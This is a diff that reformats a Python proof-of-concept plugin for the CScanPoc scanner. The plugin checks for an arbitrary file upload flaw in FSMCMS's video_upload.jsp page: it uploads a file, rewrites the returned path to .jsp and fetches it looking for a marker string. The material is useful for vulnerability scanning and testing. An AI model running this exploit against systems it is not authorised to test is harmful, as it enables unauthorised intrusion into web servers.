@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FSMCMS_0012' # 平台漏洞编号，留空
+    vuln_id = 'FSMCMS_0012'  # 平台漏洞编号，留空
     name = 'FSMCMS系统 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-10-10'  # 漏洞公布时间
     desc = '''
         北京东方文辉FSMCMS /cms/video/video_upload.jsp 页面未做过滤，可任意文件上传。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'FSMCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '59e42624-b23c-4fe0-9afb-03eb9a02ca29'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer http://www.wooyun.org/bugs/wooyun-2015-0144300
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2015-0144300
             hh = hackhttp.hackhttp()
             arg = self.target
             raw = '''
@@ -59,13 +61,14 @@ upload
             '''
             url = arg + '/cms/video/video_upload.jsp'
             code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
-            if not re.findall('opener.document.all.VideoUrl.value=\'(.*?).flv\'',res1):
+            if not re.findall('opener.document.all.VideoUrl.value=\'(.*?).flv\'', res1):
                 pass
             else:
-                shell_path = re.findall('opener.document.all.VideoUrl.value=\'(.*?).flv\'',res1)[0] + '.jsp'    
+                shell_path = re.findall(
+                    'opener.document.all.VideoUrl.value=\'(.*?).flv\'', res1)[0] + '.jsp'
                 code, head, res, errcode, _url = hh.http(arg+shell_path)
                 if code == 200 and 'testvul_upload_file_test' in res:
-                    #security_hole(arg+shell_path) 
+                    # security_hole(arg+shell_path)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -74,6 +77,7 @@ upload
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
